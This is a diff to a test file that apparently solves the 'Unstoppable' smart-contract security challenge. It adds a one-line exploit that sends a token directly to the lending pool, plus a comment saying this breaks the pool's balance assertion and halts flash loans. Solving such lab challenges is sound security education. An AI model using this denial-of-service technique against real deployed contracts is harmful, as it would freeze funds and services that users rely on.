@@ -40,6 +40,11 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.token.connect(attacker).transfer(this.pool.address, 1);
+
+        /**
+         * Noted the assert(poolBalance == balanceBefore); in UnstoppableLender.sol, changing the balance of the contract without calling depositTokens() will trigger the assert
+         */
     });
 
     after(async function () {
